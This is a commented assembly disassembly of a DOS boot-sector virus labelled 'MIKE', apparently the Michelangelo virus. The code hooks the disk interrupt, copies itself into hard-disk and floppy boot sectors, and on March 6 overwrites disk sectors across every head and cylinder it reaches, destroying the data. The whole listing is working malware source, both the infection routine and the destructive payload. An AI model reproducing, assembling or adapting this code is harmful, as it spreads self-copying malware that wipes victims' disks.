

  
PAGE  60,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        MIKE				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   29-Jan-92					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
DATA_1E		EQU	4CH				; (0000:004C=774H)
DATA_2E		EQU	4EH				; (0000:004E=70H)
DATA_3E		EQU	413H				; (0000:0413=280H)
DATA_4E		EQU	7C05H				; (0000:7C05=1E72H)
DATA_5E		EQU	7C0AH				; (0000:7C0A=0A105H)
DATA_6E		EQU	7C0CH				; (0000:7C0C=5CEH)
DATA_7E		EQU	7				; (7D30:0007=0)
DATA_8E		EQU	8				; (7D30:0008=0)
DATA_9E		EQU	0AH				; (7D30:000A=0)
DATA_11E	EQU	7C03H				; (7D30:7C03=0)
  
CODE_SEG_A	SEGMENT
		ASSUME	CS:CODE_SEG_A, DS:CODE_SEG_A
  
  
		ORG	100h
  
mike		PROC	FAR
  
start:
		JMP	LOC_6
		DB	0F5H, 0, 80H, 7FH, 2, 3
		DB	0, 1AH, 3, 0, 0C8H, 1EH
		DB	50H, 0AH, 0D2H, 75H, 1BH, 33H
		DB	0C0H, 8EH, 0D8H, 0F6H, 6, 3FH
		DB	4, 1, 75H, 10H, 58H, 1FH
		DB	9CH, 2EH, 0FFH, 1EH, 0AH, 0
		DB	9CH, 0E8H, 0BH, 0, 9DH, 0CAH
		DB	2, 0, 58H, 1FH, 2EH, 0FFH
		DB	2EH, 0AH, 0, 50H, 53H, 51H
		DB	52H, 1EH, 6, 56H, 57H, 0EH
		DB	1FH, 0EH, 7, 0BEH, 4, 0
LOC_1:
		MOV	AX,201H
		MOV	BX,200H
		MOV	CX,1
		XOR	DX,DX				; Zero register
		PUSHF					; Push flags
		CALL	DWORD PTR DS:DATA_9E		; (7D30:000A=0)
		JNC	LOC_2				; Jump if carry=0
		XOR	AX,AX				; Zero register
		PUSHF					; Push flags
		CALL	DWORD PTR DS:DATA_9E		; (7D30:000A=0)
		DEC	SI
		JNZ	LOC_1				; Jump if not zero
		JMP	SHORT LOC_5
LOC_2:
		XOR	SI,SI				; Zero register
		CLD					; Clear direction
		LODSW					; String [si] to ax
		CMP	AX,[BX]
		JNE	LOC_3				; Jump if not equal
		LODSW					; String [si] to ax
		CMP	AX,[BX+2]
		JE	LOC_5				; Jump if equal
LOC_3:
		MOV	AX,301H
		MOV	DH,1
		MOV	CL,3
		CMP	BYTE PTR [BX+15H],0FDH
		JE	LOC_4				; Jump if equal
		MOV	CL,0EH
LOC_4:
		MOV	DS:DATA_8E,CX			; (7D30:0008=0)
		PUSHF					; Push flags
		CALL	DWORD PTR DS:DATA_9E		; (7D30:000A=0)
		JC	LOC_5				; Jump if carry Set
		MOV	SI,3BEH
		MOV	DI,1BEH
		MOV	CX,21H
		CLD					; Clear direction
		REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
		MOV	AX,301H
		XOR	BX,BX				; Zero register
		MOV	CX,1
		XOR	DX,DX				; Zero register
		PUSHF					; Push flags
		CALL	DWORD PTR DS:DATA_9E		; (7D30:000A=0)
LOC_5:
		POP	DI
		POP	SI
		POP	ES
		POP	DS
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		RET
LOC_6:
		XOR	AX,AX				; Zero register
		MOV	DS,AX
		CLI					; Disable interrupts
		MOV	SS,AX
		MOV	AX,7C00H
		MOV	SP,AX
		STI					; Enable interrupts
		PUSH	DS
		PUSH	AX
		MOV	AX,DS:DATA_1E			; (0000:004C=774H)
		MOV	DS:DATA_5E,AX			; (0000:7C0A=0A105H)
		MOV	AX,DS:DATA_2E			; (0000:004E=70H)
		MOV	DS:DATA_6E,AX			; (0000:7C0C=5CEH)
		MOV	AX,DS:DATA_3E			; (0000:0413=280H)
		DEC	AX
		DEC	AX
		MOV	DS:DATA_3E,AX			; (0000:0413=280H)
		MOV	CL,6
		SHL	AX,CL				; Shift w/zeros fill
		MOV	ES,AX
		MOV	DS:DATA_4E,AX			; (0000:7C05=1E72H)
		MOV	AX,0EH
		MOV	DS:DATA_1E,AX			; (0000:004C=774H)
		MOV	DS:DATA_2E,ES			; (0000:004E=70H)
		MOV	CX,1BEH
		MOV	SI,7C00H
		XOR	DI,DI				; Zero register
		CLD					; Clear direction
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		JMP	DWORD PTR CS:DATA_11E		; (7D30:7C03=0)
		DB	33H, 0C0H, 8EH, 0C0H, 0CDH, 13H
		DB	0EH, 1FH, 0B8H, 1, 2, 0BBH
		DB	0, 7CH, 8BH, 0EH, 8, 0
		DB	83H, 0F9H, 7, 75H, 7, 0BAH
		DB	80H, 0, 0CDH, 13H, 0EBH, 2BH
		DB	8BH, 0EH, 8, 0, 0BAH, 0
		DB	1, 0CDH, 13H, 72H, 20H, 0EH
		DB	7, 0B8H, 1, 2, 0BBH, 0
		DB	2, 0B9H, 1, 0, 0BAH, 80H
		DB	0, 0CDH, 13H, 72H, 0EH, 33H
		DB	0F6H, 0FCH, 0ADH, 3BH, 7, 75H
		DB	4FH, 0ADH, 3BH, 47H, 2
		DB	75H, 49H
LOC_7:
		XOR	CX,CX				; Zero register
		MOV	AH,4
		INT	1AH				; Real time clock   ah=func 04h
							;  read date cx=year, dx=mon/day
		CMP	DX,306H
		JE	LOC_8				; Jump if equal
		RET					; Return far
LOC_8:
		XOR	DX,DX				; Zero register
		MOV	CX,1
LOC_9:
		MOV	AX,309H
		MOV	SI,DS:DATA_8E			; (7D30:0008=0)
		CMP	SI,3
		JE	LOC_10				; Jump if equal
		MOV	AL,0EH
		CMP	SI,0EH
		JE	LOC_10				; Jump if equal
		MOV	DL,80H
		MOV	BYTE PTR DS:DATA_7E,4		; (7D30:0007=0)
		MOV	AL,11H
LOC_10:
		MOV	BX,5000H
		MOV	ES,BX
		INT	13H				; Disk  dl=drive a: ah=func 03h
							;  write sectors from mem es:bx
		JNC	LOC_11				; Jump if carry=0
		XOR	AH,AH				; Zero register
		INT	13H				; Disk  dl=drive a: ah=func 00h
							;  reset disk, al=return status
LOC_11:
		INC	DH
		CMP	DH,DS:DATA_7E			; (7D30:0007=0)
		JB	LOC_9				; Jump if below
		XOR	DH,DH				; Zero register
		INC	CH
		JMP	SHORT LOC_9
LOC_12:
		MOV	CX,7
		MOV	DS:DATA_8E,CX			; (7D30:0008=0)
		MOV	AX,301H
		MOV	DX,80H
		INT	13H				; Disk  dl=drive a: ah=func 03h
							;  write sectors from mem es:bx
		JC	LOC_7				; Jump if carry Set
		MOV	SI,3BEH
		MOV	DI,1BEH
		MOV	CX,21H
		REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
		MOV	AX,301H
		XOR	BX,BX				; Zero register
		INC	CL
		INT	13H				; Disk  dl=drive a: ah=func 03h
							;  write sectors from mem es:bx
		JMP	SHORT LOC_7
		DB	79 DUP (0)
		DB	1, 55H, 0AAH
  
mike		ENDP
  
CODE_SEG_A	ENDS
  
  
  
		END	START

